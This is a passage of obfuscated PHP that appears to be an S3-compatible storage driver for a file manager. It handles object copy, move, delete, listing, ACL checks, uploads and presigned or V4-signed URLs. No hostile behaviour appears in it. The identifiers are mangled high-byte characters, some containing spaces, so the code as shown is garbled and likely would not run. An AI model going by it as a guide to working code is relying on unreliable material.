$Õ­ù±é[$îµ«ÌËÅ[221]] = explode($îµ«ÌËÅ[50], $Õ­ù±é[$îµ«ÌËÅ[221]]); } if ($Õ­ù±é[$îµ«ÌËÅ[222]] != $îµ«ÌËÅ[223] || !in_array($îµ«ÌËÅ[223], $Õ­ù±é[$îµ«ÌËÅ[221]])) { return !1; } $¾ãğé…· = array_map($îµ«ÌËÅ[224], $Õ­ù±é[$îµ«ÌËÅ[225]]); if (!is_array($¾ãğé…·)) { $¾ãğé…· = array(); } $ü§›ÂÂ = array($îµ«ÌËÅ[226], $îµ«ÌËÅ[227], $îµ«ÌËÅ[228], $îµ«ÌËÅ[229], $îµ«ÌËÅ[230]); $°Š Ñ³ = array_diff($ü§›ÂÂ, $¾ãğé…·); return empty($°Š Ñ³); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Å´ğÏÊ, $øçéå™ = '', $®şòÑ´Ø = REPEAT_RENAME) { $Åáôú‰Š = $this->setContent($Å´ğÏÊ, $øçéå™); if ($Åáôú‰Š !== !1) { return $this->getPathOuter($Å´ğÏÊ); } return !1; } public function mkdir($¨ëà»ÌÚ, $–¢Âáòª = REPEAT_SKIP) { $»É—ê£ =& $_SERVER[«òÑğ]; if (empty($¨ëà»ÌÚ) && $¨ëà»ÌÚ !== $»É—ê£[231]) { return !1; } if ($–¢Âáòª && $this->_isFolder($¨ëà»ÌÚ)) { return $this->getPathOuter($¨ëà»ÌÚ); } $ıßÁÜØË = $this->setContent($¨ëà»ÌÚ, $»É—ê£[12], !0); if ($ıßÁÜØË !== !1) { return $this->getPathOuter($¨ëà»ÌÚ); } return !1; } public function copyFile($É™Ê”“Ú, $šÀ¤ìû­, $§éÜ©¥ = array()) { $¤Áßøáü =& $_SERVER[«òÑğ]; $²èìØù = $this->objectMeta($É™Ê”“Ú); if (!$²èìØù) { return !1; } if ($²èìØù[$¤Áßøáü[79]] <= 1024 * 1024 * 200) { $ı«Ñçåƒ = $this->client->copyObject($this->bucket, $É™Ê”“Ú, $this->bucket, $šÀ¤ìû­, $¤Áßøáü[232], $§éÜ©¥); } else { $ı«Ñçåƒ = $this->client->multiCopyObject($this->bucket, $É™Ê”“Ú, $this->bucket, $šÀ¤ìû­, $§éÜ©¥); } $ı«Ñçåƒ = $ı«Ñçåƒ ? $this->getPathOuter($šÀ¤ìû­) : !1; return $ı«Ñçåƒ; } public function moveFile($¾’İÛ, $Òê†ØğŸ) { if ($this->copyFile($¾’İÛ, $Òê†ØğŸ)) { $this->delFile($¾’İÛ); return $this->getPathOuter($Òê†ØğŸ); } return !1; } public function delFile($øÑ¡ö ) { return $this->client->deleteObject($this->bucket, $øÑ¡ö ); } public function delFolder($ÂÍõĞò) { $ï¦±§®ñ =& $_SERVER[«òÑğ]; if (!$this->exist($ÂÍõĞò)) { return !0; } $this->listItemCache = !1; $Ï´ÌâÔ = $this->fileList($ÂÍõĞò); $this->listItemCache = !0; $¶ÈêŠè = trim($ÂÍõĞò, $ï¦±§®ñ[8]) . $ï¦±§®ñ[8]; if (!empty($ÂÍõĞò) && $ÂÍõĞò !== $ï¦±§®ñ[231] && !in_array($¶ÈêŠè, $Ï´ÌâÔ[$ï¦±§®ñ[85]])) { $Ï´ÌâÔ[$ï¦±§®ñ[85]][] = $¶ÈêŠè; } $ÀÍ®ı = $this->delByBatch($Ï´ÌâÔ[$ï¦±§®ñ[86]]); if (!$ÀÍ®ı) { return !1; } $ÀÍ®ı = $this->delByBatch($Ï´ÌâÔ[$ï¦±§®ñ[85]]); if (!$ÀÍ®ı) { return !1; } return $this->delFile($¶ÈêŠè); } private function delByBatch($„ƒì»¨) { foreach (array_chunk($„ƒì»¨, 1000) as $¡â—ç™Ù) { $„ èó…º = $this->client->deleteObjects($this->bucket, $¡â—ç™Ù); if (!$„ èó…º) { return !1; } } return !0; } public function rename($„£¤Š , $óŒ¿à–) { return $this->renameObject($„£¤Š , $óŒ¿à–); } public function listPath($±˜¥ıÈ, $Éş‰¾‡Á = false) { $ü•¾ıå =& $_SERVER[«òÑğ]; $¢ó÷¿œí = $this->fileList($±˜¥ıÈ, $ü•¾ıå[8], !0); foreach ($¢ó÷¿œí[$ü•¾ıå[85]] as $½­§Éñ => $åöºõ“) { $¢ó÷¿œí[$ü•¾ıå[85]][$½­§Éñ] = $this->folderInfo($åöºõ“, $Éş‰¾‡Á, $åöºõ“); } foreach ($¢ó÷¿œí[$ü•¾ıå[86]] as $½­§Éñ => $åöºõ“) { $¢ó÷¿œí[$ü•¾ıå[86]][$½­§Éñ] = $this->fileInfo($åöºõ“[$ü•¾ıå[32]], $Éş‰¾‡Á, $åöºõ“); } return $¢ó÷¿œí; } protected function infoChildren($à Ì­î£, &$çÚã¬É‘) { $½ßç£á‘ =& $_SERVER[«òÑğ]; $··¿İ¸“ = $this->fileList($à Ì­î£, $½ßç£á‘[12], !0); $çÚã¬É‘[$½ßç£á‘[81]] += count($··¿İ¸“[$½ßç£á‘[85]]); $çÚã¬É‘[$½ßç£á‘[80]] += count($··¿İ¸“[$½ßç£á‘[86]]); foreach ($··¿İ¸“[$½ßç£á‘[86]] as $µÈæé¡Ã) { if (!$µÈæé¡Ã || !$µÈæé¡Ã[$½ßç£á‘[79]]) { continue; } $çÚã¬É‘[$½ßç£á‘[79]] += $µÈæé¡Ã[$½ßç£á‘[79]]; } } private function fileInfo($‚¸È¶ò”, $ıŸİó± = false, $Š†èî¹ï = array()) { $Öª«’åò =& $_SERVER[«òÑğ]; $Èşªè´Ç = array($Öª«’åò[32] => $this->pathThis($‚¸È¶ò”), $Öª«’åò[87] => $this->getPathOuter($‚¸È¶ò”), $Öª«’åò[33] => $Öª«’åò[233], $Öª«’åò[169] => $this->ext($‚¸È¶ò”), $Öª«’åò[79] => isset($Š†èî¹ï[$Öª«’åò[79]]) ? $Š†èî¹ï[$Öª«’åò[79]] : 0); if ($ıŸİó±) { return $Èşªè´Ç; } $Èşªè´Ç[$Öª«’åò[234]] = $Èşªè´Ç[$Öª«’åò[88]] = 0; $Èşªè´Ç[$Öª«’åò[235]] = $Èşªè´Ç[$Öª«’åò[236]] = !0; if (empty($Š†èî¹ï)) { $Š†èî¹ï = $this->objectMeta($‚¸È¶ò”); if (!$Š†èî¹ï) { return $Èşªè´Ç; } } if (isset($Š†èî¹ï[$Öª«’åò[237]]) && $Š†èî¹ï[$Öª«’åò[237]]) { $Èşªè´Ç[$Öª«’åò[238]] = $Š†èî¹ï[$Öª«’åò[237]]; } if (isset($Š†èî¹ï[$Öª«’åò[207]])) { $Èşªè´Ç[$Öª«’åò[88]] = $Š†èî¹ï[$Öª«’åò[207]]; } if (isset($Š†èî¹ï[$Öª«’åò[79]])) { $Èşªè´Ç[$Öª«’åò[79]] = $Š†èî¹ï[$Öª«’åò[79]]; } return $Èşªè´Ç; } private function folderInfo($òÈ™”ï‡, $õÈ£ûÉÏ = false, $Ä¦¶¶İ = array()) { $Ô™ú« =& $_SERVER[«òÑğ]; $öë¸ˆğ = array($Ô™ú«[32] => $this->pathThis($òÈ™”ï‡), $Ô™ú«[87] => $this->getPathOuter($Ô™ú«[8] . $òÈ™”ï‡), $Ô™ú«[33] => $Ô™ú«[78]); if ($õÈ£ûÉÏ) { return $öë¸ˆğ; } $öë¸ˆğ[$Ô™ú«[234]] = $öë¸ˆğ[$Ô™ú«[88]] = 0; $öë¸ˆğ[$Ô™ú«[235]] = $öë¸ˆğ[$Ô™ú«[236]] = !0; if ($òÈ™”ï‡ == $Ô™ú«[12]) { return $öë¸ˆğ; } if (empty($Ä¦¶¶İ)) { $Ä¦¶¶İ = $this->objectMeta(trim($òÈ™”ï‡, $Ô™ú«[8]) . $Ô™ú«[8]); } if (isset($Ä¦¶¶İ[$Ô™ú«[207]])) { $öë¸ˆğ[$Ô™ú«[234]] = $Ä¦¶¶İ[$Ô™ú«[207]]; } return $öë¸ˆğ; } private function fileList($¹Û¹Í¬, $¡­¬æ±ª = '', $ïòàĞğ¿ = 0) { $•²æ—âë =& $_SERVER[«òÑğ]; $ùÖ¢ÂüÑ = rtrim($¹Û¹Í¬, $•²æ—âë[8]) . $•²æ—âë[8]; $Œ½„ ĞÛ = $this->listObjs($ùÖ¢ÂüÑ, null, null, $¡­¬æ±ª); if (!$Œ½„ ĞÛ) { return array($•²æ—âë[85] => array(), $•²æ—âë[86] => array()); } $ˆ¿øıè² = $à­¢À¬Ì = array(); foreach ($Œ½„ ĞÛ[$•²æ—âë[239]] as $Ğ©‰Ê—) { $¬ŠÎ¬ã‘ = $Ğ©‰Ê—[$•²æ—âë[32]]; if ($¬ŠÎ¬ã‘ == $ùÖ¢ÂüÑ) { continue; } $Ú·âË™ = isset($Ğ©‰Ê—[$•²æ—âë[79]]) ? $Ğ©‰Ê—[$•²æ—âë[79]] : 0; $Ö•Õ°§À = $Ú·âË™ == 0 && substr($¬ŠÎ¬ã‘, strlen($¬ŠÎ¬ã‘) - 1, 1) == $•²æ—âë[8] ? !0 : !1; $this->cacheMethodInfoSet($¬ŠÎ¬ã‘, $Ö•Õ°§À, $Ğ©‰Ê—); if ($Ö•Õ°§À) { $ˆ¿øıè²[] = $¬ŠÎ¬ã‘; continue; } $à­¢À¬Ì[] = $ïòàĞğ¿ ? $Ğ©‰Ê— : $¬ŠÎ¬ã‘; } foreach ($Œ½„ ĞÛ[$•²æ—âë[240]] as $Ğ©‰Ê—) { $ˆ¿øıè²[] = $Ğ©‰Ê—[$•²æ—âë[32]]; $this->cacheMethodInfoSet($Ğ©‰Ê—[$•²æ—âë[32]], !0); } $this->cacheMethodInfoSet($¹Û¹Í¬, !0); return array($•²æ—âë[85] => $ˆ¿øıè², $•²æ—âë[86] => $à­¢À¬Ì); } private function listObjs($Ø¾¦øÙØ, $ö€Æ¤ú = null, $÷ÓÔàó = null, $Œ¤ŸóÑÀ = null) { $¡Åí®—Í =& $_SERVER[«òÑğ]; $Ø¾¦øÙØ = trim($Ø¾¦øÙØ, $¡Åí®—Í[8]); $ÇÁ™İ±Á = empty($Ø¾¦øÙØ) && $Ø¾¦øÙØ !== $¡Åí®—Í[231] ? $¡Åí®—Í[12] : $Ø¾¦øÙØ . $¡Åí®—Í[8]; return $this->client->getBucket($this->bucket, $ÇÁ™İ±Á, $ö€Æ¤ú, $÷ÓÔàó, $Œ¤ŸóÑÀ, !0); } public function has($ª¡ÌÃıõ, $¢Úæ­ê® = false, $ÅÀ¿šší = true) { $ÖÜ‡‹ =& $_SERVER[«òÑğ]; $ª¡ÌÃıõ = trim($ª¡ÌÃıõ, $ÖÜ‡‹[8]); $»–†áˆ‚ = empty($ª¡ÌÃıõ) && $ª¡ÌÃıõ !== $ÖÜ‡‹[231] ? $ÖÜ‡‹[12] : $ª¡ÌÃıõ . $ÖÜ‡‹[8]; $úòÎŞ±ù = null; $ø¢£æÇ = 500; $µæĞö© = $ÖÜ‡‹[8]; $§€ÃÒ¼ = $·ñ©Á·Ü = array(); while (!0) { $°ÜŠİ¢¿ = $this->listObjs($ª¡ÌÃıõ, $úòÎŞ±ù, $ø¢£æÇ, $µæĞö©); if (!$°ÜŠİ¢¿) { break; } $úòÎŞ±ù = $°ÜŠİ¢¿[$ÖÜ‡‹[241]]; $Ğ˜Îİ™ = $°ÜŠİ¢¿[$ÖÜ‡‹[239]]; $öœæ¨ÃÀ = $°ÜŠİ¢¿[$ÖÜ‡‹[240]]; if (empty($Ğ˜Îİ™) && empty($öœæ¨ÃÀ)) { break; } if (count($Ğ˜Îİ™) == 1 && $Ğ˜Îİ™[0][$ÖÜ‡‹[32]] == $»–†áˆ‚) { break; } if ($¢Úæ­ê®) { if (count($Ğ˜Îİ™)) { $Ğ˜Îİ™ = array_column($Ğ˜Îİ™, $ÖÜ‡‹[32]); $§€ÃÒ¼ = array_merge($§€ÃÒ¼, $Ğ˜Îİ™); } if (count($öœæ¨ÃÀ)) { $öœæ¨ÃÀ = array_column($öœæ¨ÃÀ, $ÖÜ‡‹[32]); $·ñ©Á·Ü = array_merge($·ñ©Á·Ü, $öœæ¨ÃÀ); } if ($úòÎŞ±ù === null) { break; } continue; } if ($ÅÀ¿šší) { if (!empty($Ğ˜Îİ™)) { if (count($Ğ˜Îİ™) > 1 || isset($Ğ˜Îİ™[0][$ÖÜ‡‹[32]]) && $Ğ˜Îİ™[0][$ÖÜ‡‹[32]] != $»–†áˆ‚) { return !0; } } } else { if (!empty($öœæ¨ÃÀ)) { return !0; } } if ($úòÎŞ±ù === null) { break; } } if ($¢Úæ­ê®) { $§€ÃÒ¼ = array_diff($§€ÃÒ¼, array($»–†áˆ‚)); $§€ÃÒ¼ = count(array_unique($§€ÃÒ¼)); $·ñ©Á·Ü = count(array_unique($·ñ©Á·Ü)); return array($ÖÜ‡‹[242] => $§€ÃÒ¼, $ÖÜ‡‹[243] => $·ñ©Á·Ü); } return !1; } public function listAll($Šò£´Ó–) { $å’â‰³· =& $_SERVER[«òÑğ]; $È ñ²Ï = $this->fileList($Šò£´Ó–, $å’â‰³·[12], !0); $¢øŒ¸ÃÕ = array_to_keyvalue($È ñ²Ï[$å’â‰³·[86]], $å’â‰³·[32]); foreach ($È ñ²Ï[$å’â‰³·[85]] as $¬†“…òÎ) { if (is_string($¬†“…òÎ)) { $¢øŒ¸ÃÕ[$¬†“…òÎ] = array($å’â‰³·[79] => 0); } } return $this->listAllFiles($Šò£´Ó–, $¢øŒ¸ÃÕ); } public function canRead($¨ß¡´ò) { $´ùğº÷ =& $_SERVER[«òÑğ]; $íÁ»€İ­ = $this->client->getAccessControlPolicy($this->bucket, $¨ß¡´ò); if (!$íÁ»€İ­) { return !1; } return in_array($íÁ»€İ­, array($´ùğº÷[244], $´ùğº÷[245], $´ùğº÷[246])) ? !0 : !1; } public function canWrite($†ÑªÙù) { $•ğê®ä =& $_SERVER[«òÑğ]; $“é®´«– = $this->client->getAccessControlPolicy($this->bucket, $†ÑªÙù); if (!$“é®´«–) { return !1; } return in_array($“é®´«–, array($•ğê®ä[244], $•ğê®ä[245])) ? !0 : !1; } public function getContent($¼³¶Ãşâ) { return $this->client->getObject($this->bucket, $¼³¶Ãşâ); } public function setContent($À»º¥Â, $¨¤ŒÅ—  = '', $•¡İâ˜ = false) { $«„ÛÅ±™ =& $_SERVER[«òÑğ]; $À»º¥Â = $•¡İâ˜ ? trim($À»º¥Â, $«„ÛÅ±™[8]) . $«„ÛÅ±™[8] : $À»º¥Â; $îúËØÌÉ = get_file_mime(get_path_ext($À»º¥Â)); $áÃ’Ê¤ë = $this->client->putObject($¨¤ŒÅ— , $this->bucket, $À»º¥Â, $«„ÛÅ±™[232], array(), $îúËØÌÉ); if (!$áÃ’Ê¤ë) { return !1; } if ($•¡İâ˜) { return !0; } return $áÃ’Ê¤ë ? !0 : !1; } public function fileSubstr($’»®Çû©, $€ÄÓÓ›¥, $öûƒÑĞ) { $ŒÕÉÑ¹Á = $€ÄÓÓ›¥ + $öûƒÑĞ - 1; return $this->client->getObject($this->bucket, $’»®Çû©, array($_SERVER[«òÑğ][247] => "\x62\x79\x74\145\x73\75{$€ÄÓÓ›¥}\x2d{$ŒÕÉÑ¹Á}")); } public function upload($ÃÏªí‘ï, $šş•¼«, $‰²ãµùµ = false, $ÆñÏË¶ = REPEAT_REPLACE) { $ÕÚ”½áÒ =& $_SERVER[«òÑğ]; $—ê±ñÔ© = array($ÕÚ”½áÒ[248] => @md5_file($šş•¼«)); $Û¯Öúñ = array($ÕÚ”½áÒ[249] => get_file_mime(get_path_ext($ÃÏªí‘ï))); if (IO::size($šş•¼«) <= 1024 * 1024 * 200) { $üšôÔŠÓ = $this->client->putObjectFile($šş•¼«, $this->bucket, $ÃÏªí‘ï, $ÕÚ”½áÒ[232], $—ê±ñÔ©, $Û¯Öúñ); return !empty($üšôÔŠÓ) ? $this->getPathOuter($ÃÏªí‘ï) : !1; } $Ë¼˜ş = $this->client->multiUploadObject($šş•¼«, $this->bucket, trim($ÃÏªí‘ï, $ÕÚ”½áÒ[8]), $—ê±ñÔ©, $Û¯Öúñ); return $Ë¼˜ş ? $this->getPathOuter($ÃÏªí‘ï) : !1; } public function download($æØ»í•, $Š—÷˜€ş) { if (!@is_dir($this->pathFather($Š—÷˜€ş)) && !IO::mkdir($this->pathFather($Š—÷˜€ş))) { return !1; } $óĞÆø = $this->client->getObject($this->bucket, $æØ»í•, array(), $Š—÷˜€ş); return $óĞÆø !== !1 ? $Š—÷˜€ş : !1; } public function link($¯­„ùùğ, $ˆÉë€­à = array()) { return $this->getPreSignedURL($¯­„ùùğ, 3600 * 12, $ˆÉë€­à); } private function getPreSignedURL($í¡Ôè½, $èıÑŠ, $½Î•æÆ‰ = array(), $ëÈ×´õŠ = "\107\x45\124") { $Š­±ÇÌÓ =& $_SERVER[«òÑğ]; $í¡Ôè½ = trim($í¡Ôè½, $Š­±ÇÌÓ[8]); if ($this->signVer == $Š­±ÇÌÓ[250]) { return $this->client->getPreSignedV2URL($this->bucket, $í¡Ôè½, $èıÑŠ, $ëÈ×´õŠ, $½Î•æÆ‰); } return $this->client->getPreSignedV4URL($this->bucket, $í¡Ôè½, $èıÑŠ, array(), $ëÈ×´õŠ, $½Î•æÆ‰); } public function fileOut($ø×ª®éÄ, $¼³¨Ñì« = false, $–õÍàñ = false, $àšıé = '') { $íÍ‘Š‚ =& $_SERVER[«òÑğ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ø×ª®éÄ, $¼³¨Ñì«, $–õÍàñ, $àšıé); } if (!$–õÍàñ) { $–õÍàñ = $this->pathThis($ø×ª®éÄ); } $‹¹Ò£ = get_file_mime(get_path_ext($–õÍàñ)); if ($‹¹Ò£ == $íÍ‘Š‚[251]) { return parent::fileOut($ø×ª®éÄ, $¼³¨Ñì«, $–õÍàñ, $àšıé); } $áêáàˆí = array($íÍ‘Š‚[252] => $‹¹Ò£); if ($¼³¨Ñì«) { $áêáàˆí[$íÍ‘Š‚[253]] = $íÍ‘Š‚[254] . rawurlencode($–õÍàñ); } else { } $öÅ—ï ’ = $this->link($ø×ª®éÄ, $áêáàˆí); $this->fileOutLink($öÅ—ï ’); } public function fileOutServer($ÙÃçëê, $€õ°Êİš = false, $¿ğ©©º = false, $ßò¥ğë‡ = '') { parent::fileOut($ÙÃçëê, $€õ°Êİš, $¿ğ©©º, $ßò¥ğë‡); } public function fileOutImageServer($¯ÇÔğ®û, $ÊŒ÷Éˆ = 250) { parent::fileOutImage($¯ÇÔğ®û, $ÊŒ÷Éˆ); } public function hashMd5($ıŞ·Ä¼š, $ğ‘ôö” = '') { $çÙı¡ñ = $this->objectMeta($ıŞ·Ä¼š); if (!$çÙı¡ñ) { return !1; } $ğ‘ôö” = $ğ‘ôö” ? $ğ‘ôö” : _get($çÙı¡ñ, $_SERVER[«òÑğ][255]); return $ğ‘ôö”; } public function uploadFormData($­¼”™Ş¡, $š’ˆÈ¶² = 3600) { $˜éòšû =& $_SERVER[«òÑğ]; if (!$this->_isClientAsync()) { $Æë¨í¼é = $this->getPreSignedURL($­¼”™Ş¡, $š’ˆÈ¶², array(), $˜éòšû[256]); return array($˜éòšû[209] => str_replace($˜éòšû[219], $˜éòšû[257], $Æë¨í¼é)); } if (isset($GLOBALS[$˜éòšû[6]][$˜éòšû[92]][$˜éòšû[258]]) && $GLOBALS[$˜éòšû[6]][$˜éòšû[92]][$˜éòšû[258]] == $˜éòšû[231]) { return $this->uploadMultiData($­¼”™Ş¡, $š’ˆÈ¶²); } if ($this->signVer == $˜éòšû[250]) { return $this->uploadFormDataV2($­¼”™Ş¡, $š’ˆÈ¶²); } return $this->uploadFormDataV4($­¼”™Ş¡, $š’ˆÈ¶²); } public function uploadFormDataV2($¤Î»ä™—, $”›³Ÿıü = 3600) { $òÏ¯³Öƒ =& $_SERVER[«òÑğ]; $õª¿ªâë = $this->pathFather($¤Î»ä™—); $áô¨®Æ¬ = $this->client->getHttpUploadPostParams($this->bucket, $õª¿ªâë, $òÏ¯³Öƒ[232], $”›³Ÿıü); $şŸÓ¦Õ“ = array_merge((array) $áô¨®Æ¬, array($òÏ¯³Öƒ[259] => $òÏ¯³Öƒ[250], $òÏ¯³Öƒ[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($şŸÓ¦Õ“[$òÏ¯³Öƒ[259]]); } return $şŸÓ¦Õ“; } public function uploadFormDataV4($ĞÍÁ‹°», $ÃÊ¡î ˆ = 3600) { $¡š› ®î =& $_SERVER[«òÑğ]; $•Ùäš·‡ = $¡š› ®î[232]; $“ç­à½“ = $¡š› ®î[260]; $„‰Ø·Ïİ = $¡š› ®î[62]; $§Æú’üå = gmdate($¡š› ®î[261]); $À’€œ¨ã = gmdate($¡š› ®î[262]); $õÂç¤ìõ = $¡š› ®î[263]; $ç£ØË² = $ÃÊ¡î ˆ . $¡š› ®î[12]; $ûâšáç¸ = $¡š› ®î[264]; $´òÖ¶Ğ– = array($this->accessKey, $À’€œ¨ã, $this->region, $„‰Ø·Ïİ, $õÂç¤ìõ); $í¾æô‰Ó = implode($¡š› ®î[8], $´òÖ¶Ğ–); $½ºÀ˜®Æ = array($¡š› ®î[265] => gmdate($¡š› ®î[266], strtotime($¡š› ®î[267])), $¡š› ®î[268] => array(array($¡š› ®î[269] => $this->bucket), array($¡š› ®î[270], $¡š› ®î[271], $¡š› ®î[12]), array($¡š› ®î[270], $¡š› ®î[272], $¡š› ®î[12]), array($¡š› ®î[273] => $ûâšáç¸), array($¡š› ®î[274] => $í¾æô‰Ó), array($¡š› ®î[275] => $“ç­à½“), array($¡š› ®î[276] => $§Æú’üå), array($¡š› ®î[277] => $ç£ØË²))); $£èªÖàÂ = base64_encode(json_encode($½ºÀ˜®Æ)); $é©œ¬™ = hash_hmac($¡š› ®î[278], $À’€œ¨ã, $¡š› ®î[279] . $this->secret, !0); $Ùòáİöö = hash_hmac($¡š› ®î[278], $this->region, $é©œ¬™, !0); $¡—´Ã­¸ = hash_hmac($¡š› ®î[278], $„‰Ø·Ïİ, $Ùòáİöö, !0); $í¥ëÚ™İ = hash_hmac($¡š› ®î[278], $õÂç¤ìõ, $¡—´Ã­¸, !0); $ü¢ÅËóñ = hash_hmac($¡š› ®î[278], $£èªÖàÂ, $í¥ëÚ™İ); $Üã·ˆ½¿ = array($¡š› ®î[249] => $¡š› ®î[12], $¡š› ®î[273] => $ûâšáç¸, $¡š› ®î[280] => $£èªÖàÂ, $¡š› ®î[274] => $í¾æô‰Ó, $¡š› ®î[275] => $“ç­à½“, $¡š› ®î[276] => $§Æú’üå, $¡š› ®î[277] => $ç£ØË², $¡š› ®î[281] => $ü¢ÅËóñ, $¡š› ®î[259] => $¡š› ®î[250], $¡š› ®î[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($Üã·ˆ½¿[$¡š› ®î[259]]); } return $Üã·ˆ½¿; } public function uploadMultiData($ƒ©ŞšÛ¯, $şÂÇı = 3600) { $±Á›ªíô =& $_SERVER[«òÑğ]; $ã€¦©ÑÖ = $this->signVer == $±Á›ªíô[250] ? gmdate($±Á›ªíô[282]) : gmdate($±Á›ªíô[283]); $òÉ´ëÎ¹ = array(); $–¡‰Ù½× = $this->client->getUploadId($this->bucket, $ƒ©ŞšÛ¯, $òÉ´ëÎ¹); if (!$–¡‰Ù½×) { return !1; } $ıƒ•Ò¶¹ = array($±Á›ªíô[284] => $–¡‰Ù½×, $±Á›ªíô[209] => $this->getHost() . $±Á›ªíô[8] . $this->pathEncode($ƒ©ŞšÛ¯), $±Á›ªíô[285] => $ã€¦©ÑÖ, $±Á›ªíô[97] => $ƒ©ŞšÛ¯, $±Á›ªíô[259] => $this->signVer); if ($this->_isClientAsync()) { unset($ıƒ•Ò¶¹[$±Á›ªíô[259]]); } return $ıƒ•Ò¶¹; } public function uploadMultiAuth($à³ÁŞ›, $”× ÖåÒ = array()) { $»ô¦–¢ =& $_SERVER[«òÑğ]; if ($this->signVer == $»ô¦–¢[250]) { if (isset($”× ÖåÒ[$»ô¦–¢[286]])) { return $this->uploadPartAuthV2($à³ÁŞ›, $”× ÖåÒ); } return $this->uploadListAuthV2($à³ÁŞ›, $”× ÖåÒ); } if (isset($”× ÖåÒ[$»ô¦–¢[286]])) { return $this->uploadPartAuthV4($à³ÁŞ›, $”× ÖåÒ); } return $this->uploadListAuthV4($à³ÁŞ›, $”× ÖåÒ); } public function uploadPartAuthV2($Ê„É‡¸‰, $¹÷¢×Àè = array()) { $¤£¦·Ñ— =& $_SERVER[«òÑğ]; $Öø£¤Ó = $¹÷¢×Àè[$¤£¦·Ñ—[97]]; $¬èò¢ç = gmdate($¤£¦·Ñ—[282]); $±‚Û¦Ú = array_intersect_key($¹÷¢×Àè, array_flip(array($¤£¦·Ñ—[286], $¤£¦·Ñ—[284]))); ksort($±‚Û¦Ú); $Ùâ‹ı = $±‚Û¦Ú ? $¤£¦·Ñ—[76] . http_build_query($±‚Û¦Ú, null, $¤£¦·Ñ—[287], PHP_QUERY_RFC3986) : $¤£¦·Ñ—[12]; $ü¿½ä– = array($¤£¦·Ñ—[256], $¤£¦·Ñ—[12], $¤£¦·Ñ—[123], $¤£¦·Ñ—[12], "\x78\x2d\x61\155\x7a\x2d\x64\x61\164\145\72{$¬èò¢ç}", $¤£¦·Ñ—[8] . $this->bucket . $¤£¦·Ñ—[8] . $this->pathEncode($Öø£¤Ó) . $Ùâ‹ı); $æâ±Ú£Ã = implode($¤£¦·Ñ—[288], $ü¿½ä–); $£ñ—Šü¯ = $this->client->__getSignature($æâ±Ú£Ã); return array($¤£¦·Ñ—[289] => $£ñ—Šü¯, $¤£¦·Ñ—[285] => $¬èò¢ç); } public function uploadListAuthV2($ª¢±ÑÛµ, $»úúæ¢õ = array()) { $°àÂú¡Œ =& $_SERVER[«òÑğ]; $Ü£Ëê…ª = $»úúæ¢õ[$°àÂú¡Œ[97]]; $ê›Ø» ˆ = $»úúæ¢õ[$°àÂú¡Œ[284]]; $â´ ÙĞò = $this->client->listParts($this->bucket, $Ü£Ëê…ª, $ê›Ø» ˆ); if (!$â´ ÙĞò) { return !1; } $š½Ñ”–™ = gmdate($°àÂú¡Œ[282]); $ú¤ı²ÛŒ = $°àÂú¡Œ[290] . $ê›Ø» ˆ; $ ù²ù£ğ = array($°àÂú¡Œ[291], $°àÂú¡Œ[12], $°àÂú¡Œ[123], $°àÂú¡Œ[12], "\170\x2d\141\x6d\x7a\x2d\144\141\x74\x65\72{$š½Ñ”–™}", $°àÂú¡Œ[8] . $this->bucket . $°àÂú¡Œ[8] . $this->pathEncode($Ü£Ëê…ª) . $ú¤ı²ÛŒ); $¿ØÚ¿÷õ = implode($°àÂú¡Œ[288], $ ù²ù£ğ); $Ù”ª¬¯¦ = $this->client->__getSignature($¿ØÚ¿÷õ); return array($°àÂú¡Œ[289] => $Ù”ª¬¯¦, $°àÂú¡Œ[285] => $š½Ñ”–™, $°àÂú¡Œ[292] => $â´ ÙĞò); } public function uploadPartAuthV4($Ïó¹ÂËë, $½€È¾°ˆ = array()) { $æØø˜Í =& $_SERVER[«òÑğ]; $ØÂşş³– = $½€È¾°ˆ[$æØø˜Í[97]]; $”°äÚª = array($æØø˜Í[276] => gmdate($æØø˜Í[283]), $æØø˜Í[293] => _get($½€È¾°ˆ, $æØø˜Í[294], hash($æØø˜Í[278], $æØø˜Í[12]))); $¿ëùƒ„Ù = explode($æØø˜Í[211], $this->getHost()); $õ³¥£Û = array($æØø˜Í[295] => $¿ëùƒ„Ù[1], $æØø˜Í[296] => $æØø˜Í[12], $æØø˜Í[249] => $æØø˜Í[123], $æØø˜Í[297] => $½€È¾°ˆ[$æØø˜Í[79]]); $ß¥‹ÓÔ‹ = $æØø˜Í[256]; $ı““Çí¥ = $æØø˜Í[8] . $this->pathEncode($ØÂşş³–); $Ÿ°¨ø¢“ = array_intersect_key($½€È¾°ˆ, array_flip(array($æØø˜Í[286], $æØø˜Í[284]))); $îğ™¥ë´ = $this->client->__getSignatureV4($”°äÚª, $õ³¥£Û, $ß¥‹ÓÔ‹, $ı““Çí¥, $Ÿ°¨ø¢“); return array($æØø˜Í[289] => $îğ™¥ë´, $æØø˜Í[293] => $”°äÚª[$æØø˜Í[293]], $æØø˜Í[285] => $”°äÚª[$æØø˜Í[276]]); } public function uploadListAuthV4($æÄõ¥Ş, $ÄŸáß = array()) { $ìàôŠ‚˜ =& $_SERVER[«òÑğ]; $ü·éäÒğ = $ÄŸáß[$ìàôŠ‚˜[97]]; $²¾É÷»Ÿ = $ÄŸáß[$ìàôŠ‚˜[284]]; $š¿µ—Õå = $this->client->listParts($this->bucket, $ü·éäÒğ, $²¾É÷»Ÿ); if (!$š¿µ—Õå) { return !1; } $ÈƒÛ½­£ = $ìàôŠ‚˜[298]; foreach ($š¿µ—Õå as $ÙÕÎ¯å¡) { $ÈƒÛ½­£ .= $ìàôŠ‚˜[299] . "\x3c\120\x61\x72\164\x4e\x75\x6d\x62\x65\162\76{$ÙÕÎ¯å¡[$ìàôŠ‚˜[300]]}\74\57\120\141\x72\164\116\x75\155\x62\145\x72\x3e\12" . "\x3c\x45\x54\x61\147\76{$ÙÕÎ¯å¡[$ìàôŠ‚˜[301]]}\x3c\x2f\x45\x54\x61\147\76\12" . $ìàôŠ‚˜[302]; } $ÈƒÛ½­£ .= $ìàôŠ‚˜[303]; $†­Ú•åâ = array($ìàôŠ‚˜[276] => gmdate($ìàôŠ‚˜[283]), $ìàôŠ‚˜[293] => hash($ìàôŠ‚˜[278], $ÈƒÛ½­£)); $Ò­ìù±ğ = explode($ìàôŠ‚˜[211], $this->getHost()); $ÍËÌÀÁß = array($ìàôŠ‚˜[295] => $Ò­ìù±ğ[1], $ìàôŠ‚˜[249] => $ìàôŠ‚˜[123], $ìàôŠ‚˜[297] => 